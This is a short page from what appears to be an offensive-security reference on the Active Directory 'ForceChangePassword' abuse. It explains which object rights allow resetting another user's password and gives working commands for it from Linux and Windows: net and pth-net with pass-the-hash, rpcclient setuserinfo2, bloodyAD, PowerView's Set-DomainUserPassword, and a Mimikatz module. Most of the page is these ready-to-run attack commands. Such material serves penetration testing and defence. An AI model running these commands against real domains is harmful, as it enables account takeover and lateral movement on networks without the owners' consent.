# ForceChangePassword

This abuse can be carried out when controlling an object that has a `GenericAll`, `AllExtendedRights` or `User-Force-Change-Password` over the target user.

=== UNIX-like

It can also be achieved from UNIX-like system with [net](https://linux.die.net/man/8/net), a tool for the administration of samba and cifs/smb clients. The [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit) can also be used to run net commands with [pass-the-hash](../ntlm/pth.md).

```bash
# With net and cleartext credentials (will be prompted)
net rpc password "$TargetUser" -U "$DOMAIN"/"$USER" -S "$DC_HOST"

# With net and cleartext credentials
net rpc password "$TargetUser" -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"

# With Pass-the-Hash
pth-net rpc password "$TargetUser" -U "$DOMAIN"/"$USER"%"ffffffffffffffffffffffffffffffff":"$NT_HASH" -S "$DC_HOST"
```

The [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) can also be used on UNIX-like systems when the package `samba-common-bin` is missing.

```bash
rpcclient -U $DOMAIN/$ControlledUser $DomainController
rpcclient $> setuserinfo2 $TargetUser 23 $NewPassword
```

Alternatively, it can be achieved using [bloodyAD](https://github.com/CravateRouge/bloodyAD)

```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set password "$TargetUser" "$NewPassword"
```


=== Windows

The attacker can change the password of the user. This can be achieved with [Set-DomainUserPassword](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainUserPassword/) ([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module).

```bash
$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
```

Mimikatz's [`lsadump::setntlm`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/setntlm) can also be used for that purpose.
